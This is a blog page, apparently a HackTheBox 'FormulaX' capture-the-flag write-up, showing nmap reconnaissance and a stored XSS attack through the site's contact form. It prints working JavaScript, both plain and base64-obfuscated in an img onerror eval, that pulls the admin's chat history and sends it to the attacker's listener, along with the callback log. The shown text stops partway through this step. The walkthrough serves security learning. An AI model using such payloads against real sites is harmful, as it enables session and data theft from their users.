@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/08/17/hackthebox-formulax/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewFormulaX is a hard-difficulty machine from HackTheBox, where we initially have an XSS foothold to be able to access a hidden subdomain with CVE-2022-24439. Later obtaining hidden credentials f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: FormulaX">
+<meta property="og:url" content="http://foued-saidi.tech/2024/08/17/Hackthebox-FormulaX/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewFormulaX is a hard-difficulty machine from HackTheBox, where we initially have an XSS foothold to be able to access a hidden subdomain with CVE-2022-24439. Later obtaining hidden credentials f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/FormulaX.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/web-app-80.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/web-app-2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/chatbot.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/contact.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/xss1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/xss2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/new-subdomain.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/dev-git-auto-update.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/simple-git.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/CVE-2022-24439.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/soffice-exploit.png">
+<meta property="article:published_time" content="2024-08-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-17T14:38:07.262Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/FormulaX/FormulaX.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: FormulaX -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["SecuriNets for life <3."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: FormulaX</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-17 17:00</span>
+        <span class="mobile">2024-08-17 17:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-08-17 15:38:07</span>
+            <span class="mobile">2024-08-17 15:38:07</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>FormulaX is a hard-difficulty machine from HackTheBox, where we initially have an XSS foothold to be able to access a hidden subdomain with CVE-2022-24439. Later obtaining hidden credentials from a mongo database to acquire our user flag. And finally taking advantage of exposed credentials using <code>librenms</code> and utilizing a public exploit of LibreOffice to obtain our root flag. </p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/FormulaX.png"
+                      alt="FormulaX-info-card"
+                ><figcaption>FormulaX-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">230.190</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-08-16</span> <span class="number">20</span>:<span class="number">39</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2640</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">230.190</span></span><br><span class="line">Host is up (<span class="number">0.35</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">6</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">5</span>fb2cd54e447d10e9e8135923cd6a3cb (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> b9f00ddc057bfafb91e6d0b459e6db88 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">| http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">|_Requested resource was /static/index.html</span></span><br><span class="line"><span class="string">|_http-cors: GET POST</span></span><br><span class="line"><span class="string">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></span><br><span class="line"><span class="string">TCP/IP fingerprint:</span></span><br><span class="line"><span class="string">OS:SCAN(V=7.93%E=4%D=8/16%OT=22%CT=1%CU=33472%PV=Y%DS=2%DC=T%G=Y%TM=66BFAB7</span></span><br><span class="line"><span class="string">OS:9%P=i686-pc-windows-windows)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I)SEQ(</span></span><br><span class="line"><span class="string">OS:CI=Z%II=I)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=B)OPS(O1=M54EST11NW</span></span><br><span class="line"><span class="string">OS:7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST</span></span><br><span class="line"><span class="string">OS:11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40</span></span><br><span class="line"><span class="string">OS:%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R</span></span><br><span class="line"><span class="string">OS:=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W</span></span><br><span class="line"><span class="string">OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)</span></span><br><span class="line"><span class="string">OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U</span></span><br><span class="line"><span class="string">OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Distance: 2 hops</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE (using port 1723/tcp)</span></span><br><span class="line"><span class="string">HOP RTT       ADDRESS</span></span><br><span class="line"><span class="string">1   477.00 ms 10.10.16.1</span></span><br><span class="line"><span class="string">2   477.00 ms 10.129.230.190</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 129.08 seconds</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have OpenSSH running on port 22, and web application exposed on port 80.</p>
+<h3 id="Web-Application-http-10-129-230-190"><a href="#Web-Application-http-10-129-230-190" class="headerlink" title="Web Application - http://10.129.230.190"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://10.129.230.190/" >http://10.129.230.190 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/web-app-80.png"
+                      alt="Web App Port 80"
+                ><figcaption>Web App Port 80</figcaption></figure></p>
+<p>This seems like a casual web application with login and registration features. We register a casual user and login with it:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/web-app-2.png"
+                      alt="User login"
+                ><figcaption>User login</figcaption></figure></p>
+<p>Two features that I could see as interesting are the <code>Chat Now</code> and <code>Contact Us</code>.</p>
+<h4 id="ChatBot-http-10-129-230-190-restricted-chat-html"><a href="#ChatBot-http-10-129-230-190-restricted-chat-html" class="headerlink" title="ChatBot - http://10.129.230.190/restricted/chat.html"></a>ChatBot - <a class="link"   target="_blank" rel="noopener" href="http://10.129.230.190/restricted/chat.html" >http://10.129.230.190/restricted/chat.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/chatbot.png"
+                      alt="ChatBot"
+                ><figcaption>ChatBot</figcaption></figure></p>
+<p>Seems like the chatbot is not currently working as it is responding to all my commands with the same output.</p>
+<h4 id="Contact-Form-http-10-129-230-190-restricted-contact-us-html"><a href="#Contact-Form-http-10-129-230-190-restricted-contact-us-html" class="headerlink" title="Contact Form - http://10.129.230.190/restricted/contact_us.html"></a>Contact Form - <a class="link"   target="_blank" rel="noopener" href="http://10.129.230.190/restricted/contact_us.html" >http://10.129.230.190/restricted/contact_us.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/contact.png"
+                      alt="Contact Us"
+                ><figcaption>Contact Us</figcaption></figure></p>
+<p>The title of the page is <code>Contact to Admin</code>, maybe the admin will see our request? This gives me directly a thought towards XSS (Cross-Site Scripting)</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/xss1.png"
+                      alt="XSS"
+                ><figcaption>XSS</figcaption></figure></p>
+<p>And we get a response:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\OneDrive\Bureau\HackThebox\HTB_Machines\FormulaX&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">45</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">45</span>] <span class="string">&quot;OPTIONS /undefined HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br></pre></td></tr></table></figure></div>
+
+<p>But seems we’re getting an error about an unsupported Method. This made me think that my code is not suitable to this XSS especially.<br>Digging a bit deeper, I discovered a <a target="_blank" rel="noopener" href="http://10.129.230.190/restricted/chat.js"><code>chat.js</code></a> file that provided me with a lot of help regarding communications in this web app:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/xss2.png"
+                      alt="XSS"
+                ><figcaption>XSS</figcaption></figure></p>
+<p>This script allowed me to deeply understand the communications happening in the back-end of how the chatbot is interpreting messages, and allowed me to craft this payload:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;/socket.io/socket.io.js&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">script.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> res = axios.<span class="title function_">get</span>(<span class="string">`/user/api/chat`</span>); <span class="keyword">const</span> socket = <span class="title function_">io</span>(<span class="string">&#x27;/&#x27;</span>,&#123;<span class="attr">withCredentials</span>: <span class="literal">true</span>&#125;); socket.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">my_message</span>) =&gt;</span> &#123;<span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.x.x/?d=&quot;</span> + <span class="title function_">btoa</span>(my_message))&#125;) ; socket.<span class="title function_">emit</span>(<span class="string">&#x27;client_message&#x27;</span>, <span class="string">&#x27;history&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>Then I encoded the payload to base64:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="variable constant_">SRC</span>=x onerror=<span class="string">&#x27;eval(atob(&quot;Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7DQpzY3JpcHQuc3JjID0gJy9zb2NrZXQuaW8vc29ja2V0LmlvLmpzJzsNCmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsNCnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7DQpjb25zdCByZXMgPSBheGlvcy5nZXQoYC91c2VyL2FwaS9jaGF0YCk7IGNvbnN0IHNvY2tldCA9IGlvKCcvJyx7d2l0aENyZWRlbnRpYWxzOiB0cnVlfSk7IHNvY2tldC5vbignbWVzc2FnZScsIChteV9tZXNzYWdlKSA9PiB7ZmV0Y2goImh0dHA6Ly8xMC4xMC54LngvP2Q9IiArIGJ0b2EobXlfbWVzc2FnZSkpfSkgOyBzb2NrZXQuZW1pdCgnY2xpZW50X21lc3NhZ2UnLCAnaGlzdG9yeScpOw0KfSk7&quot;));&#x27;</span> /&gt;</span><br></pre></td></tr></table></figure></div>
+<p>We insert our payload inside the contact form, and we get a callback:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] <span class="string">&quot;OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br><span 